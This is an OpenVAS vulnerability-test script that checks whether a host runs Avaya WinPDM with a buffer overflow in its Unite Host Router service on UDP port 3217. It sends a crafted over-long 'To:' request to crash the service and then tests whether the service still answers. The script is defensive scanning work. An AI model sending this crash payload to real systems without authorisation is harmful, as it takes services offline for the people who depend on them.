###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_avaya_winpmd_mult_bof_vuln.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# Avaya WinPDM Multiple Buffer Overflow Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow unauthenticated attackers to cause the
  application to crash.
  Impact Level: Application";
tag_affected = "Avaya WinPDM version 3.8.2 and prior";
tag_insight = "Multiple flaws are due to a boundary error in,
  - Unite Host Router service (UniteHostRouter.exe) when processing certain
    requests can be exploited to cause a stack-based buffer overflow via
    long string to the 'To:' field sent to UDP port 3217.
  - UspCsi.exe when processing certain crafted overly long string requests
    can be exploited to cause a heap-based buffer overflow via a specially
    crafted overly long string sent to UDP port 10136.
  - CuspSerialCsi.exe when processing certain crafted overly long string
    requests can be exploited to cause a heap-based buffer overflow via a
    specially crafted overly long string sent to UDP port 10158.
  - MwpCsi.exe when processing certain crafted overly long string requests
    can be exploited to cause a heap-based buffer overflow via a specially
    crafted overly long string sent to UDP port 10137.
  - PMServer.exe when processing certain requests can be exploited to cause
    a heap-based buffer overflow via a specially crafted overly long string
    sent to UDP port 10138.";
tag_solution = "Upgrade to Avaya WinPDM 3.8.5 or later,
  For updates refer to http://support.avaya.com/products/";
tag_summary = "The host is running Avaya WinPDM and is prone to multiple buffer overflow
  vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802469");
  script_version("$Revision: 9352 $");
  script_bugtraq_id(47947);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2012-10-12 12:33:59 +0530 (Fri, 12 Oct 2012)");
  script_name("Avaya WinPDM Multiple Buffer Overflow Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/44062/");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18397/");
  script_xref(name : "URL" , value : "https://downloads.avaya.com/css/P8/documents/100140122");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/117209/Avaya-WinPMD-UniteHostRouter-Buffer-Overflow.html");

  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_udp_ports(3217);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


##
## The script code starts here
##

## Variable Initialization
port = 3217;
soc = "";
resp = "";
data = "";
req = "";

## Check Port State
if(!get_udp_port_state(port)){
  exit(0);
}

## open socket
soc = open_sock_udp(port);
if(!soc){
  exit(0);
}

## Construct the proper request to respond server
req = '\x55\x54\x50\x2f\x31' + ## UTP Protocol
      ' To: 127.0.0.1' +       ## To header
      ' /';

send(socket:soc, data:req + '\r\n\r\n');
resp = recv(socket:soc, length:1024);

## Confirm the service is live
if(resp && "503 Destination service not found" >< resp)
{
  ## Construct the crafted request
  data = req + crap(data: "A", length: 265) + '\r\n\r\n';

  ## send the crafted data
  send(socket:soc, data:data);

  ## close the socket
  close(soc);

  ## Try to open the socket
  soc = open_sock_udp(port);
  if(soc)
  {
    ## send construct proper request
    send(socket:soc, data:req + '\r\n\r\n');

    ## Get the server response
    resp = recv(socket:soc, length:1024);

    ## if it not responding anything service is crashed
    if(!resp && "503 Destination service not found" >!< resp){
      security_message(port:port);
    }
    close(soc);
  }
  else{
    security_message(port:port);
  }
}
